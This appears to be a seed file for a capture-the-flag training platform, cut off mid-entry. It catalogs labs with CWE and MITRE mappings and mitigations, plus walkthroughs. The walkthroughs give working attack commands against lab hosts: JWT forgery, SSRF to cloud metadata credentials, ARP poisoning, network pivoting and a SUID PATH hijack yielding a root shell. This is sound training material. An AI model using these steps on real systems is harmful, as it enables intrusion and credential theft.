// ViperRange — 50-Lab Catalog Extension (v2)
// ZeroDay Security Services
//
// Adds the second half of the arena: 14 new labs across API, NETWORK, LINUX and
// OSINT, re-tiering of the original 39 onto the L1–L6 scale, three deprecations
// and three category corrections. `prisma/seed.js` merges this into the catalog.
//
// Target distribution: 10 categories × 5 labs = 50
// Difficulty: L1=8, L2=10, L3=12, L4=10, L5=7, L6=3

// Labs removed in v2. They duplicated mechanics covered by stronger labs:
// factor-hunt (narrow-key), hill-descent (chinese-broadcast), stack-flood
// (overflow-zero/overflow-one).
const DEPRECATED = ["factor-hunt", "hill-descent", "stack-flood"];

// Category corrections — these five labs are misc techniques, not web-app bugs.
const REMAP = {
  "pixel-cache": "MISC",
  "crawler-protocol": "MISC",
  "style-injector": "MISC",
};

// Per-lab metadata. `level` drives the L1–L6 scale; the 4-value `difficulty`
// enum stays as the coarse label the UI already renders.
const LEVEL_TO_DIFFICULTY = {
  1: "BEGINNER",
  2: "BEGINNER",
  3: "INTERMEDIATE",
  4: "INTERMEDIATE",
  5: "ADVANCED",
  6: "EXPERT",
};

const META = {
  // ── WEB_APP ────────────────────────────────────────────────────────────────
  "file-oracle": {
    level: 3,
    objective: "Chain a local file inclusion into a command-injection gate and read the collector output.",
    tools: ["Browser", "curl"],
    cwe: "CWE-98",
    mitre: "T1190",
    mitigation: "Allow-list includable modules, never concatenate user input into include paths, and run PHP with open_basedir enforced.",
  },
  "session-architect": {
    level: 1,
    objective: "Escalate from a free tier to the paid content tier by decoding and editing a client-controlled cookie.",
    tools: ["Browser"],
    cwe: "CWE-565",
    mitre: "T1539",
    mitigation: "Never encode authorisation state client-side; store the entitlement server-side and sign any cookie you must issue.",
  },
  "cipher-gate": {
    level: 3,
    objective: "Recover the passphrase hidden in obfuscated client-side JavaScript and reach the maintenance console.",
    tools: ["Browser", "curl"],
    cwe: "CWE-656",
    mitre: "T1552",
    mitigation: "Enforce gates server-side; never ship secrets to the browser, obfuscated or otherwise.",
  },
  "loose-types": {
    level: 3,
    objective: "Inject a server-side variable through query-string parameter import and take over the feature-flag scope.",
    tools: ["Browser", "curl"],
    cwe: "CWE-621",
    mitre: "T1190",
    mitigation: "Never call extract() on request data; read an explicit allow-list of keys.",
  },
  "template-engine": {
    level: 4,
    objective: "Achieve server-side template injection, read the cookie-signing secret, and forge an admin session.",
    tools: ["Browser", "curl"],
    cwe: "CWE-1336",
    mitre: "T1190",
    mitigation: "Never compile user input as template source; pass data to a fixed template as variables.",
  },

  // ── CRYPTO ─────────────────────────────────────────────────────────────────
  "masked-xor": {
    level: 2,
    objective: "Defeat a repeating-key XOR cipher obfuscated with a periodic decoy character.",
    tools: ["Python"],
    cwe: "CWE-327",
    mitre: "T1140",
    mitigation: "Use authenticated encryption (AES-GCM); a repeating XOR key is not encryption.",
  },
  "rotor-maze": {
    level: 2,
    objective: "Recover the unknown rotor settings on a partially documented Enigma configuration.",
    tools: ["Python"],
    cwe: "CWE-327",
    mitre: "T1140",
    mitigation: "Classical rotor machines have tiny key spaces by modern standards; never use them for real traffic.",
  },
  "narrow-key": {
    level: 3,
    objective: "Recover an unusually small RSA private exponent with Wiener's continued-fraction attack.",
    tools: ["Python"],
    cwe: "CWE-326",
    mitre: "T1140",
    mitigation: "Enforce d > N^0.292 and generate keys with a vetted library.",
  },
  "chinese-broadcast": {
    level: 3,
    objective: "Recover a message broadcast under three RSA moduli with a small public exponent using CRT.",
    tools: ["Python"],
    cwe: "CWE-327",
    mitre: "T1140",
    mitigation: "Pad before RSA encryption; textbook RSA with small e is multiplicatively homomorphic.",
  },
  "block-flip": {
    level: 4,
    objective: "Exploit CBC malleability to rewrite the decrypted role block of an authentication token.",
    tools: ["Python"],
    cwe: "CWE-353",
    mitre: "T1556",
    mitigation: "Use an AEAD mode or append a MAC over ciphertext, and verify it before decryption.",
  },

  // ── FORENSICS ──────────────────────────────────────────────────────────────
  "binary-carve": {
    level: 1,
    objective: "Carve a second file appended after an image's end-of-file marker.",
    tools: ["binwalk", "Python"],
    cwe: "CWE-506",
    mitre: "T1027",
    mitigation: "Validate file length against declared structure; appended data is not benign by default.",
  },
  "stego-lock": {
    level: 3,
    objective: "Extract an LSB-hidden archive and crack its passphrase from a wordlist.",
    tools: ["steghide", "Python"],
    cwe: "CWE-506",
    mitre: "T1027.003",
    mitigation: "Content inspection at egress; steganography defeats naive extension-based filters.",
  },
  "braille-cipher": {
    level: 3,
    objective: "Recover an LSB payload and decode it from six-bit Braille cells into ASCII.",
    tools: ["Python", "zsteg"],
    cwe: "CWE-506",
    mitre: "T1027.003",
    mitigation: "Re-encode images on upload to strip hidden LSB data.",
  },
  "hex-delta": {
    level: 3,
    objective: "Crack an archive password and diff two near-identical images to recover the flag.",
    tools: ["fcrackzip", "Python"],
    cwe: "CWE-522",
    mitre: "T1110.002",
    mitigation: "Use long random passphrases; short dictionary passwords fall instantly.",
  },
  "invisible-script": {
    level: 4,
    objective: "Chain LSB steganography into audio steganography, then read a whitespace-language program.",
    tools: ["Python", "Audacity"],
    cwe: "CWE-506",
    mitre: "T1027.003",
    mitigation: "Layered obfuscation still leaves artefacts; treat all media as untrusted input.",
  },

  // ── LINUX ──────────────────────────────────────────────────────────────────
  "alias-prison": {
    level: 1,
    objective: "Escape a restricted shell whose read commands are shadowed by harmless aliases.",
    tools: ["Bash"],
    cwe: "CWE-78",
    mitre: "T1059.004",
    mitigation: "Restrict execution with rbash plus an enforced allow-list; aliases are not a security boundary.",
  },
  "deep-grep": {
    level: 1,
    objective: "Find the single file in a large tree that differs from all of its near-identical siblings.",
    tools: ["grep", "diff"],
    cwe: "CWE-200",
    mitre: "T1083",
    mitigation: "File-system permissions, not obscurity, must protect sensitive content.",
  },
  "chroot-breach": {
    level: 3,
    objective: "Break out of a chroot jail using credentials left inside it and unrestricted egress.",
    tools: ["Bash", "ssh"],
    cwe: "CWE-243",
    mitre: "T1611",
    mitigation: "chroot is not a container; use namespaces with dropped capabilities and no egress.",
  },
  "linux-suid-path": {
    level: 2,
    objective: "Abuse a SUID binary that resolves its helper through the caller's PATH.",
    tools: ["Bash", "find"],
    cwe: "CWE-426",
    mitre: "T1548.001",
    mitigation: "Call helpers by absolute path, drop privileges before exec, and audit SUID binaries for relative lookups.",
  },
  "linux-cap-sysadmin": {
    level: 5,
    objective: "Escalate to root from a binary granted CAP_SYS_ADMIN by mounting over a protected path.",
    tools: ["Bash", "getcap", "unshare"],
    cwe: "CWE-269",
    mitre: "T1548",
    mitigation: "Never grant CAP_SYS_ADMIN to non-root binaries; prefer narrowly scoped capabilities or none at all.",
  },

  // ── PWN ────────────────────────────────────────────────────────────────────
  "overflow-zero": {
    level: 1,
    objective: "Overflow a stack buffer to clobber an adjacent integer and satisfy a fixed-value check.",
    tools: ["gdb", "Python"],
    cwe: "CWE-121",
    mitre: "T1203",
    mitigation: "Never use gets(); compile with -fstack-protector-strong and FORTIFY_SOURCE.",
  },
  "overflow-one": {
    level: 2,
    objective: "Craft an exact-length overflow that overwrites a checked integer with a specific hex constant.",
    tools: ["gdb", "Python"],
    cwe: "CWE-121",
    mitre: "T1203",
    mitigation: "Bounds-check every copy; stack canaries would have stopped this.",
  },
  "return-jump": {
    level: 3,
    objective: "Overwrite a saved return address to jump into a never-called function that prints the flag.",
    tools: ["gdb", "objdump", "Python"],
    cwe: "CWE-121",
    mitre: "T1203",
    mitigation: "Enable canaries plus ASLR and build with -D_FORTIFY_SOURCE=2.",
  },
  "format-string": {
    level: 4,
    objective: "Use %n in a user-controlled format string to write to an arbitrary address and pass the login check.",
    tools: ["gdb", "Python"],
    cwe: "CWE-134",
    mitre: "T1203",
    mitigation: "Never pass user input as a format string; use printf(\"%s\", input).",
  },
  "smash-stack": {
    level: 4,
    objective: "Overflow with strcpy to redirect execution into a libc function and spawn a shell.",
    tools: ["gdb", "pwntools"],
    cwe: "CWE-121",
    mitre: "T1203",
    mitigation: "Use strlcpy/snprintf, enable NX and canaries, and keep libc offsets out of reach with ASLR.",
  },

  // ── REVERSING ──────────────────────────────────────────────────────────────
  "pascal-decoder": {
    level: 3,
    objective: "Reverse a combinatorial validation routine and automate the expected responses.",
    tools: ["Python", "objdump"],
    cwe: "CWE-656",
    mitre: "T1027",
    mitigation: "Client-side validation is advisory only; enforce every check server-side.",
  },
  "multi-layer": {
    level: 4,
    objective: "Undo a Caesar shift, XOR keystream and two fixed transpositions in the correct order.",
    tools: ["Python"],
    cwe: "CWE-327",
    mitre: "T1140",
    mitigation: "Layered homemade ciphers fail under differential analysis; use standard AEAD.",
  },
  "bytecode-maze": {
    level: 4,
    objective: "Reconstruct two helper functions from Python bytecode and invert the encoding chain.",
    tools: ["Python", "dis"],
    cwe: "CWE-656",
    mitre: "T1027",
    mitigation: "Shipping bytecode without source is obfuscation, not protection.",
  },
  "math-circuit": {
    level: 3,
    objective: "Identify the arithmetic relation enforced by a compiled checker and automate the answers.",
    tools: ["gdb", "Python"],
    cwe: "CWE-656",
    mitre: "T1027",
    mitigation: "Keep protocol logic server-side; a local checker is always reversible.",
  },
  "egg-matrix": {
    level: 6,
    objective: "Reverse a five-stage scramble (rotation, two keyed swaps, substitution) and recover the flag.",
    tools: ["Python"],
    cwe: "CWE-327",
    mitre: "T1140",
    mitigation: "Composition of weak transforms is still weak; use a single reviewed primitive.",
  },

  // ── OSINT ──────────────────────────────────────────────────────────────────
  "digital-echo": {
    level: 1,
    objective: "Pivot from a leaked graphic through fictional social accounts to the original post.",
    tools: ["Browser", "Reverse Image Search"],
    cwe: "CWE-200",
    mitre: "T1593",
    mitigation: "Strip EXIF on upload and avoid correlatable handles across platforms.",
  },
  "ghost-archive": {
    level: 4,
    objective: "Detect manipulation in a fictional archival plate and identify what was removed.",
    tools: ["Browser", "Photo Forensics"],
    cwe: "CWE-345",
    mitre: "T1592",
    mitigation: "Preserve provenance hashes for archival media; publish originals with signed timestamps.",
  },
  "shadow-agent": {
    level: 5,
    objective: "Correlate scattered fictional clues into a movement timeline and a hierarchy.",
    tools: ["Browser", "Investigation Notes"],
    cwe: "CWE-200",
    mitre: "T1591",
    mitigation: "Compartmentalise operational data; small independent leaks compose into a full picture.",
  },
  "osint-username-pivot": {
    level: 2,
    objective: "Pivot a single fictional handle across platforms to recover an email pattern and the flag it guards.",
    tools: ["Browser"],
    cwe: "CWE-200",
    mitre: "T1589.002",
    mitigation: "Use per-site handles and never derive credentials from public identifiers.",
  },
  "osint-geolocation": {
    level: 5,
    objective: "Geolocate a fictional photograph from visual and text clues and recover the pinned coordinate flag.",
    tools: ["Browser", "Maps"],
    cwe: "CWE-200",
    mitre: "T1591.004",
    mitigation: "Strip location metadata and avoid photographing identifiable landmarks alongside sensitive material.",
  },

  // ── MISC ───────────────────────────────────────────────────────────────────
  "voice-inject": {
    level: 1,
    objective: "Inject shell metacharacters through a text-to-speech bot that writes its input into a script.",
    tools: ["Browser", "curl"],
    cwe: "CWE-78",
    mitre: "T1059.004",
    mitigation: "Never build shell commands from user text; pass argv directly to the process.",
  },
  "pixel-cache": {
    level: 2,
    objective: "Read build metadata left in a production stylesheet and use it to reach an internal path.",
    tools: ["Browser", "curl"],
    cwe: "CWE-200",
    mitre: "T1592.002",
    mitigation: "Strip comments and source maps from production assets.",
  },
  "crawler-protocol": {
    level: 1,
    objective: "Enumerate a crawler exclusion policy to discover unlinked sensitive paths.",
    tools: ["Browser", "curl"],
    cwe: "CWE-200",
    mitre: "T1590",
    mitigation: "robots.txt is disclosure, not access control; protect paths with authentication.",
  },
  "style-injector": {
    level: 4,
    objective: "Break out of a CSS rule with an unsanitised colour value and exfiltrate a hidden session field.",
    tools: ["Browser"],
    cwe: "CWE-74",
    mitre: "T1059.007",
    mitigation: "Validate colour values against a strict pattern and set a restrictive CSP.",
  },
  "eval-escape": {
    level: 5,
    objective: "Escape a Python eval() sandbox on a remote arithmetic service and read the flag file.",
    tools: ["Python", "netcat"],
    cwe: "CWE-95",
    mitre: "T1059.006",
    mitigation: "Never eval untrusted input; if you must, use ast.literal_eval with an allow-listed node set.",
  },
};

// ── New labs (14) ─────────────────────────────────────────────────────────────
// Everything below is authored for ViperRange. Flags follow VR{...}; the seed
// hashes them, so nothing here is stored in plaintext at rest.

const NEW_LABS = [
  // ══ API (5) ════════════════════════════════════════════════════════════════
  {
    slug: "api-bola-vault",
    name: "Object Vault",
    category: "API",
    level: 4,
    labType: "OFFLINE",
    points: 180,
    tags: ["BOLA", "IDOR", "Authorization"],
    description: `A document vault exposes /api/v1/vault/{id} and checks that you are logged in — not that the document belongs to you. Enumerate an adjacent object identifier and read another tenant's vault entry.`,
    objective: "Exploit broken object level authorisation to read a document owned by a different tenant.",
    prerequisites: ["HTTP fundamentals", "Reading JSON APIs"],
    tools: ["curl", "Browser"],
    cwe: "CWE-639",
    mitre: "T1190",
    mitigation: "Derive the object owner from the session, never from the path, and scope every query by tenant id.",
    flag: "VR{bola_tenant_document_leak}",
    hints: [
      { order: 1, text: "Authorisation is checked at the collection level. What happens when you request an id you don't own?", pointsPenalty: 15 },
      { order: 2, text: "Identifiers are sequential integers. Try the neighbours of your own document.", pointsPenalty: 20 },
    ],
    walkthroughs: [
      {
        title: "Enumerating Adjacent Objects",
        tool: "curl",
        order: 1,
        content: `# Object Vault — BOLA

## Step 1 — Log in and inspect your own document
\`\`\`bash
curl -s -b cookies.txt https://YOUR-LAB-URL/api/v1/vault/1042
\`\`\`
The response includes \`"owner":"you"\` and a benign note.

## Step 2 — Change only the identifier
\`\`\`bash
for id in 1038 1039 1040 1041 1043; do
  curl -s -b cookies.txt https://YOUR-LAB-URL/api/v1/vault/$id
done
\`\`\`

One neighbour returns a document belonging to another tenant, including the flag in its \`secret\` field. The endpoint validated the session but never compared \`document.ownerId\` to the caller — broken object level authorisation.`,
      },
    ],
  },
  {
    slug: "api-jwt-alg-confusion",
    name: "Algorithm Confusion",
    category: "API",
    level: 5,
    labType: "OFFLINE",
    points: 200,
    tags: ["JWT", "alg confusion", "HS256"],
    description: `A token service accepts RS256 and HS256 and picks the verification routine from the token header. Sign your own token with the public key as an HMAC secret and promote yourself to admin.`,
    objective: "Forge an admin token by exploiting algorithm confusion in JWT verification.",
    prerequisites: ["JWT structure", "HMAC vs RSA"],
    tools: ["Python", "jwt_tool"],
    cwe: "CWE-347",
    mitre: "T1550.001",
    mitigation: "Pin the expected algorithm server-side and reject any token whose alg differs; never use a public key as an HMAC secret.",
    flag: "VR{jwt_alg_confusion_admin}",
    hints: [
      { order: 1, text: "Decode the header of your token. Which two algorithms does the service advertise?", pointsPenalty: 20 },
      { order: 2, text: "HS256 verification uses a secret. What does the server pass as that secret when the header says HS256?", pointsPenalty: 25 },
    ],
    walkthroughs: [
      {
        title: "Confusing RS256 with HS256",
        tool: "Python",
        order: 1,
        content: `# Algorithm Confusion

## Step 1 — Grab the public key
\`\`\`bash
curl -s https://YOUR-LAB-URL/.well-known/jwks.json
\`\`\`
The service publishes an RSA public key it also uses as the HMAC secret when \`alg: HS256\`.

## Step 2 — Mint an admin token
\`\`\`python
import jwt, requests
pub = requests.get("https://YOUR-LAB-URL/api/keys/public").text
token = jwt.encode({"sub":"u1","role":"admin"}, pub, algorithm="HS256")
print(token)
\`\`\`

## Step 3 — Replay it
\`\`\`bash
curl -s -H "Authorization: Bearer $TOKEN" https://YOUR-LAB-URL/api/admin/flag
\`\`\`
The server verifies the HMAC with its *public* key, so the forged signature is valid — that's the confusion.`,
      },
    ],
  },
  {
    slug: "api-mass-assignment",
    name: "Field Injection",
    category: "API",
    level: 2,
    labType: "OFFLINE",
    points: 120,
    tags: ["Mass Assignment", "Privilege Escalation"],
    description: `A profile update endpoint copies every submitted field into the user record. The form only shows name and bio — but nothing stops you from posting fields it never rendered.`,
    objective: "Escalate to instructor by adding an unrendered field to a profile update request.",
    prerequisites: ["HTTP methods", "JSON bodies"],
    tools: ["curl"],
    cwe: "CWE-915",
    mitre: "T1548",
    mitigation: "Bind request bodies to an explicit schema and ignore unknown keys.",
    flag: "VR{mass_assignment_role_promote}",
    hints: [
      { order: 1, text: "The UI posts two fields. Read the API's validation errors — does it complain about extra keys?", pointsPenalty: 10 },
      { order: 2, text: "The user model has a `role` column. Try setting it to `instructor`.", pointsPenalty: 15 },
    ],
    walkthroughs: [
      {
        title: "Adding a Field the Form Never Sends",
        tool: "curl",
        order: 1,
        content: `# Mass Assignment

## Step 1 — Your normal update
\`\`\`bash
curl -s -X PATCH https://YOUR-LAB-URL/api/me \\
  -H "Content-Type: application/json" -b cookies.txt \\
  -d '{"name":"Ada","bio":"student"}'
\`\`\`

## Step 2 — Add the privileged field
\`\`\`bash
curl -s -X PATCH https://YOUR-LAB-URL/api/me \\
  -H "Content-Type: application/json" -b cookies.txt \\
  -d '{"name":"Ada","bio":"student","role":"instructor"}'
\`\`\`

## Step 3 — Read the instructor-only resource
\`\`\`bash
curl -s -b cookies.txt https://YOUR-LAB-URL/api/instructor/flag
\`\`\`
The handler passed the body straight into the ORM, so the extra key was written.`,
      },
    ],
  },
  {
    slug: "api-graphql-introspection",
    name: "Schema Whisper",
    category: "API",
    level: 2,
    labType: "OFFLINE",
    points: 120,
    tags: ["GraphQL", "Introspection", "Schema Discovery"],
    description: `A GraphQL gateway leaves introspection enabled in production and hides its sensitive fields behind a deprecated directive. Enumerate the schema, find the legacy query, and read what the UI never offers.`,
    objective: "Use GraphQL introspection to discover a deprecated-but-live query and retrieve the flag.",
    prerequisites: ["GraphQL basics", "HTTP POST"],
    tools: ["Browser", "curl"],
    cwe: "CWE-200",
    mitre: "T1592",
    mitigation: "Disable introspection in production and remove deprecated fields rather than hiding them with directives.",
    flag: "VR{graphql_introspection_schema_leak}",
    hints: [
      { order: 1, text: "POST the standard introspection query to /graphql and look at the `types` array.", pointsPenalty: 10 },
      { order: 2, text: "Search the schema for the word `deprecated` — the field name is a hint at its own history.", pointsPenalty: 15 },
    ],
    walkthroughs: [
      {
        title: "Dumping and Querying the Schema",
        tool: "curl",
        order: 1,
        content: `# GraphQL Introspection

## Step 1 — Dump the schema
\`\`\`bash
curl -s https://YOUR-LAB-URL/graphql -H "Content-Type: application/json" \\
  -d '{"query":"query{__schema{types{name fields{name isDeprecated deprecationReason}}}}"}' | python -m json.tool
\`\`\`

## Step 2 — Find the deprecated query
The \`Query\` type contains \`legacyFlag\` with \`isDeprecated: true\` and the reason \`"use flagReport instead"\`. \`flagReport\` rejects non-admins; \`legacyFlag\` never got its auth check removed along with the directive.

## Step 3 — Query it
\`\`\`bash
curl -s https://YOUR-LAB-URL/graphql -H "Content-Type: application/json" \\
  -d '{"query":"query{legacyFlag}"}'
\`\`\``,
      },
    ],
  },
  {
    slug: "api-ssrf-webhook",
    name: "Webhook Relay",
    category: "API",
    level: 6,
    labType: "OFFLINE",
    points: 250,
    tags: ["SSRF", "Cloud Metadata", "DNS Rebinding"],
    description: `A webhook tester fetches whatever URL you give it and blocks only the literal string "169.254.169.254". Reach the metadata service anyway, walk the instance role, and exfiltrate a signed token.`,
    objective: "Bypass a naive SSRF filter to reach the cloud metadata service and recover the instance credentials.",
    prerequisites: ["DNS basics", "Redirects", "Cloud metadata APIs"],
    tools: ["curl", "Python"],
    cwe: "CWE-918",
    mitre: "T1552.005",
    mitigation: "Resolve and pin destinations, block link-local ranges and redirects, and require IMDSv2 with a hop limit of 1.",
    flag: "VR{ssrf_metadata_credential_theft}",
    hints: [
      { order: 1, text: "A blocklist on one literal IPv4 address is easy to walk past. Consider alternate notations and redirects.", pointsPenalty: 25 },
      { order: 2, text: "The metadata service answers on 169.254.169.254 in decimal, octal and hex forms — and follows 30x redirects.", pointsPenalty: 30 },
    ],
    walkthroughs: [
      {
        title: "Reaching IMDS Through the Relay",
        tool: "curl",
        order: 1,
        content: `# SSRF Filter Bypass

## Step 1 — Confirm the filter
\`\`\`bash
curl -s "https://YOUR-LAB-URL/api/webhook?url=http://169.254.169.254/latest/meta-data/"
\`\`\`
Returns \`blocked\`. Only that exact string is filtered.

## Step 2 — Same address, different notation
\`\`\`bash
curl -s "https://YOUR-LAB-URL/api/webhook?url=http://2852039166/latest/meta-data/"
\`\`\`
Decimal-encoded 169.254.169.254 passes the string check and the server issues the request.

## Step 3 — Walk to the role token
\`\`\`bash
curl -s "https://YOUR-LAB-URL/api/webhook?url=http://2852039166/latest/meta-data/iam/security-credentials/"
curl -s "https://YOUR-LAB-URL/api/webhook?url=http://2852039166/latest/meta-data/iam/security-credentials/viperrange-webhook-role"
\`\`\`
The relayed response contains the role credentials, including the flag embedded in the session token's policy comment.`,
      },
    ],
  },

  // ══ NETWORK (5) ════════════════════════════════════════════════════════════
  {
    slug: "net-dns-axfr",
    name: "Zone Transfer",
    category: "NETWORK",
    level: 2,
    labType: "OFFLINE",
    points: 120,
    tags: ["DNS", "AXFR", "Reconnaissance"],
    description: `An internal DNS server still allows zone transfers from any address. Pull the whole zone in one query and map the network — including the record that should never have been published.`,
    objective: "Perform an unauthenticated AXFR against the target nameserver and locate the leaked record.",
    prerequisites: ["DNS record types", "dig"],
    tools: ["dig", "nslookup"],
    cwe: "CWE-200",
    mitre: "T1590.002",
    mitigation: "Restrict AXFR to secondary nameservers by ACL, and keep internal names out of public zones.",
    flag: "VR{dns_axfr_zone_leak}",
    hints: [
      { order: 1, text: "Ask the server for the zone itself rather than a single record.", pointsPenalty: 10 },
      { order: 2, text: "`dig AXFR @ns1.<target> <zone>` — the zone name is derivable from the SOA record.", pointsPenalty: 15 },
    ],
    walkthroughs: [
      {
        title: "Pulling the Zone",
        tool: "dig",
        order: 1,
        content: `# DNS Zone Transfer

## Step 1 — Find the zone
\`\`\`bash
dig SOA viperrange.lab @ns1.viperrange.lab +short
\`\`\`

## Step 2 — Request the transfer
\`\`\`bash
dig AXFR viperrange.lab @ns1.viperrange.lab
\`\`\`
The server answers with every record: hosts, internal service names, and a TXT record \`flag.viperrange.lab\` containing the flag. A properly configured server would refuse unless you were a listed secondary.`,
      },
    ],
  },
  {
    slug: "net-ftp-anon",
    name: "Anonymous Drop",
    category: "NETWORK",
    level: 2,
    labType: "OFFLINE",
    points: 120,
    tags: ["FTP", "Anonymous Access", "Enumeration"],
    description: `A legacy file server still accepts anonymous FTP logins with write access to one directory and read access to another. Browse the shares and collect what the decommissioned backup process left behind.`,
    objective: "Log in to the FTP service anonymously and retrieve the archived flag from a readable share.",
    prerequisites: ["FTP protocol", "Basic shell"],
    tools: ["ftp", "curl"],
    cwe: "CWE-287",
    mitre: "T1078.001",
    mitigation: "Disable anonymous access and audit share permissions; use SFTP with key auth instead of plaintext FTP.",
    flag: "VR{ftp_anonymous_archive_read}",
    hints: [
      { order: 1, text: "The banner advertises anonymous read access. Try user `anonymous` with any email as the password.", pointsPenalty: 10 },
      { order: 2, text: "`ls -la` in the share directory; the archive is not in the root.", pointsPenalty: 15 },
    ],
    walkthroughs: [
      {
        title: "Anonymous Session to Archive Read",
        tool: "curl",
        order: 1,
        content: `# Anonymous FTP

## Step 1 — List the root
\`\`\`bash
curl -s ftp://anonymous:x@ftp.viperrange.lab/
\`\`\`

## Step 2 — Walk the readable share
\`\`\`bash
curl -s ftp://anonymous:x@ftp.viperrange.lab/backups/
curl -s ftp://anonymous:x@ftp.viperrange.lab/backups/2024-11/notes.txt
\`\`\`

\`notes.txt\` contains the flag the backup job wrote before the server was decommissioned.`,
      },
    ],
  },
  {
    slug: "net-smb-enum",
    name: "Share Sweep",
    category: "NETWORK",
    level: 5,
    labType: "OFFLINE",
    points: 200,
    tags: ["SMB", "Null Session", "Enumeration"],
    description: `A file server permits null-session SMB enumeration and exposes a share whose permissions were copied from a template that granted Everyone read. Enumerate users and shares, then read the audit export.`,
    objective: "Use null-session enumeration to discover an over-permissioned SMB share and exfiltrate its audit export.",
    prerequisites: ["SMB basics", "Windows ACLs"],
    tools: ["smbclient", "enum4linux"],
    cwe: "CWE-732",
    mitre: "T1135",
    mitigation: "Disable null sessions, require SMB signing, and apply least privilege to share ACLs.",
    flag: "VR{smb_null_session_share_read}",
    hints: [
      { order: 1, text: "Start with share enumeration, not user enumeration — the share name is the giveaway.", pointsPenalty: 20 },
      { order: 2, text: "`smbclient -N -L //target` lists shares without credentials. One name looks like a compliance artefact.", pointsPenalty: 20 },
    ],
    walkthroughs: [
      {
        title: "Null Session to Share Read",
        tool: "smbclient",
        order: 1,
        content: `# SMB Null Session

## Step 1 — List shares without credentials
\`\`\`bash
smbclient -N -L //files.viperrange.lab
\`\`\`
\`audit\$ \` appears alongside the usual IPC shares.

## Step 2 — Connect and list
\`\`\`bash
smbclient -N //files.viperrange.lab/audit\$ -c "ls"
\`\`\`

## Step 3 — Retrieve the export
\`\`\`bash
smbclient -N //files.viperrange.lab/audit\$ -c "get compliance-export.csv"
\`\`\`
The CSV's final row holds the flag, written by the compliance job that was supposed to be restricted to the audit group.`,
      },
    ],
  },
  {
    slug: "net-arp-spoof",
    name: "Poisoned Arp",
    category: "NETWORK",
    level: 5,
    labType: "OFFLINE",
    points: 200,
    tags: ["ARP Spoofing", "MITM", "Packet Analysis"],
    description: `Two hosts on a flat segment exchange an unencrypted session. Poison the ARP cache of one side, forward the capture anyway, and pull the credential the client sent in the clear.`,
    objective: "Perform ARP cache poisoning on a lab segment and recover a plaintext credential from the intercepted session.",
    prerequisites: ["ARP", "TCP handshake", "tcpdump"],
    tools: ["arpspoof", "tcpdump", "Wireshark"],
    cwe: "CWE-300",
    mitre: "T1557.002",
    mitigation: "Enable dynamic ARP inspection and port security, and never transmit credentials over plaintext protocols.",
    flag: "VR{arp_poison_plaintext_credential}",
    hints: [
      { order: 1, text: "The client authenticates over a protocol with no transport encryption. Which one, and to whom does it trust its gateway?", pointsPenalty: 20 },
      { order: 2, text: "Poison both directions and enable IP forwarding, or you'll black-hole the session you're trying to read.", pointsPenalty: 25 },
    ],
    walkthroughs: [
      {
        title: "Poison, Forward, Capture",
        tool: "Wireshark",
        order: 1,
        content: `# ARP Poisoning

## Step 1 — Enable forwarding
\`\`\`bash
sysctl -w net.ipv4.ip_forward=1
\`\`\`

## Step 2 — Poison both sides
\`\`\`bash
arpspoof -i eth0 -t 10.10.0.20 10.10.0.1
arpspoof -i eth0 -t 10.10.0.1 10.10.0.20
\`\`\`

## Step 3 — Capture the login
\`\`\`bash
tcpdump -i eth0 -A 'tcp port 21'
\`\`\`
The client's FTP \`USER\` / \`PASS\` pair appears in the clear; the flag is the password's trailing segment referenced in the case brief.`,
      },
    ],
  },
  {
    slug: "net-port-pivot",
    name: "Silent Pivot",
    category: "NETWORK",
    level: 6,
    labType: "OFFLINE",
    points: 250,
    tags: ["Pivoting", "Tunnelling", "Segmentation"],
    description: `You have a foothold on a dual-homed jump host. The flag lives on an internal service that is unreachable from your position — build a tunnel through the host you already own and reach it anyway.`,
    objective: "Establish a tunnel through a compromised dual-homed host to reach an internal-only service.",
    prerequisites: ["Port forwarding", "SSH", "Routing"],
    tools: ["ssh", "proxychains", "nmap"],
    cwe: "CWE-923",
    mitre: "T1572",
    mitigation: "Segment internal services and require authentication between tiers; a single foothold must not grant east-west reach.",
    flag: "VR{internal_pivot_segmentation_bypass}",
    hints: [
      { order: 1, text: "The jump host can reach the second network. You don't need a new exploit — you need a route.", pointsPenalty: 25 },
      { order: 2, text: "SSH supports dynamic forwarding. Point a proxy client at the SOCKS port and scan through it.", pointsPenalty: 30 },
    ],
    walkthroughs: [
      {
        title: "SOCKS Pivot Through the Jump Host",
        tool: "ssh",
        order: 1,
        content: `# Pivoting

## Step 1 — Open a dynamic forward
\`\`\`bash
ssh -D 1080 -N -f user@10.10.0.20
\`\`\`

## Step 2 — Route tooling through it
\`\`\`bash
echo "socks5 127.0.0.1 1080" >> /etc/proxychains.conf
proxychains nmap -Pn -sT 172.16.0.0/24 -p 8080
\`\`\`

## Step 3 — Reach the internal service
\`\`\`bash
proxychains curl http://172.16.0.10:8080/health
proxychains curl http://172.16.0.10:8080/internal/flag
\`\`\`
The internal service never anticipated a client arriving from inside the trusted segment.`,
      },
    ],
  },

  // ══ LINUX (2) ══════════════════════════════════════════════════════════════
  {
    slug: "linux-suid-path",
    name: "Relative Helper",
    category: "LINUX",
    level: 2,
    labType: "OFFLINE",
    points: 120,
    tags: ["SUID", "PATH Hijack", "Privilege Escalation"],
    description: `A SUID maintenance binary runs as root but resolves its helper command through the caller's PATH. Plant your own helper earlier in PATH and the binary will execute it as root.`,
    objective: "Escalate to root by hijacking the PATH lookup of a SUID binary's helper command.",
    prerequisites: ["Linux permissions", "Shell scripting"],
    tools: ["find", "Bash"],
    cwe: "CWE-426",
    mitre: "T1548.001",
    mitigation: "Call helpers by absolute path, set a safe PATH in the program, and drop privileges before exec.",
    flag: "VR{suid_relative_path_hijack}",
    hints: [
      { order: 1, text: "Find binaries with the SUID bit, then inspect what they execute.", pointsPenalty: 10 },
      { order: 2, text: "`strings` on the binary shows a bare command name, not an absolute path.", pointsPenalty: 15 },
    ],
    walkthroughs: [
      {
        title: "Find the SUID Binary, Hijack the Helper",
        tool: "Bash",
        order: 1,
        content: `# PATH Hijack

## Step 1 — Locate SUID binaries
\`\`\`bash
find / -perm -4000 -type f 2>/dev/null
\`\`\`
\`/usr/local/bin/vr-maint\` stands out.

## Step 2 — Inspect what it calls
\`\`\`bash
strings /usr/local/bin/vr-maint | grep -E 'tar|rsync|cp|ls'
\`\`\`
It shells out to \`tar\` by bare name.

## Step 3 — Plant and trigger
\`\`\`bash
printf '#!/bin/sh\\n/bin/sh -p\\n' > /tmp/tar && chmod +x /tmp/tar
PATH=/tmp:$PATH /usr/local/bin/vr-maint
id   # uid=0(root)
cat /root/flag.txt
\`\`\``,
      },
    ],
  },
  {
    slug: "linux-cap-sysadmin",
    name: "Mounted Escape",
    category: "LINUX",
